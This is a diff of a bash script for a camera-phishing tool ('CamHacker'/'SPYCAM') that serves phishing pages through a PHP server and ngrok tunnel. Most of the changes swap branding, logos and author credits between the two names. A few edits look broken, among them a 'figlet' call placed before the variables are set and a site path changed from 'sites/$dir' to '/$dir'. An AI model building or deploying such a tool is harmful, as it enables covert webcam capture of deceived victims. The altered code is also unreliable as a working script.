@@ -1,5 +1,5 @@
-#!/bin/bash
 
+figlet SPYCAM
 
 black="\033[1;30m"
 red="\033[1;31m"
@@ -26,7 +26,7 @@ version="1.5"
 cwd=`pwd`
 tunneler_dir="$HOME/.tunneler"
 
-# Logo
+# logo
 logo="
 ${green}  ____                _   _            _
 ${red} / ___|__ _ _ __ ___ | | | | __ _  ___| | _____ _ __
@@ -36,8 +36,13 @@ ${yellow} \____\__,_|_| |_| |_|_| |_|\__,_|\___|_|\_\___|_|
 ${red}                                            [v${version}]
 ${blue}                                    [By KasRoudra]
 "
-clear
-figlet SPYCAM
+logo="
+${red}____  ______   ______    _    __  __
+${green}/ ___||  _ \ \ / / ___|  / \  |  \/  |
+${yellow}\___ \| |_) \ V / |     / _ \ | |\/| |
+${cyan} ___) |  __/ | || |___ / ___ \| |  | |
+${blue}|____/|_|    |_| \____/_/   \_\_|  |_|
+"
 ngrok_help="
 ${info}Steps: ${nc}
 ${blue}[1]${yellow} Go to ${green}https://ngrok.com
@@ -92,7 +97,7 @@ if command -v brew > /dev/null 2>&1; then
     fi
 fi
 
-ch_prompt="\n${cyan}SPY${nc}@${cyan}CAM ${red}$ ${nc}"
+ch_prompt="\n${cyan}Cam${nc}@${cyan}Hacker ${red}$ ${nc}"
 
 # Kill running instances of required packages
 killer() {
@@ -365,16 +370,13 @@ if [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
     changelog=$(curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/changelog.log)
     clear
     echo -e "$logo"
-clear
- figlet SPYCAM 
-echo "TOOL WAS CREATED BY @GAZEW_FF AND @CRAZY_HACKER404"
-    echo -e "${info}SPYCAM has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
-        printf "${ask}Do you want to update SPYCAM${yellow}[y/n] > $green"
+    echo -e "${info}CamHacker has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
+        printf "${ask}Do you want to update CamHacker?${yellow}[y/n] > $green"
         read upask
         printf "$nc"
         if [[ "$upask" == "y" ]]; then
             cd .. && rm -rf CamHacker camhacker && git clone https://github.com/KasRoudra/CamHacker
-            echo -e "\n${success}SPYCAM updated successfully!!"
+            echo -e "\n${success}CamHacker updated successfully!!"
             if [[ "$changelog" != "404: Not Found" ]]; then
                 echo -e "${purple}[•] Changelog:\n${blue}"
                 echo -e "$changelog" | head -n4
@@ -439,9 +441,6 @@ fi
 while true; do
 clear
 echo -e "$logo"
-clear
-        figlet SPYCAM 
-echo "TOOL WAS CREATED BY @GAZEW_FF AND @CRAZY_HACKER404"
 sleep 1
 echo -e "${ask}Choose an option:
 
@@ -517,16 +516,13 @@ fi
     elif echo $option | grep -q "x"; then
         clear
         echo -e "$logo"
-clear
-        figlet SPYCAM 
-echo "TOOL WAS CREATED BY @GAZEW_FF AND @CRAZY_HACKER404"
-        echo -e "$red[ToolName]  ${cyan}  :[SPYCAM]
+        echo -e "$red[ToolName]  ${cyan}  :[CamHacker]
 $red[Version]    ${cyan} :[${version}]
 $red[Description]${cyan} :[Camera Phishing tool]
-$red[Author]     ${cyan} :[CRAZY_HACKER404]
+$red[Author]     ${cyan} :[KasRoudra]
 $red[Github]     ${cyan} :[https://github.com/KasRoudra]
 $red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
-$red[Email]      ${cyan} :[ksparsh265@gmail.com]"
+$red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
         printf "$ch_prompt"
         read about
     elif echo $option | grep -q "m"; then
@@ -559,12 +555,12 @@ if ! [ -d sites ]; then
     unzip websites.zip -d sites > /dev/null 2>&1
     rm -rf websites.zip
 fi
-cd sites/$dir
+cd /$dir
 cp -r * "$HOME/.site"
 # Hotspot required for termux
 if $termux; then
     echo -e "\n${info2}If you haven't turned on hotspot, please enable it!"
-    sleep 3
+    sleep 2
 fi
 echo -e "\n${info}Starting php server at localhost:${PORT}....\n"
 netcheck
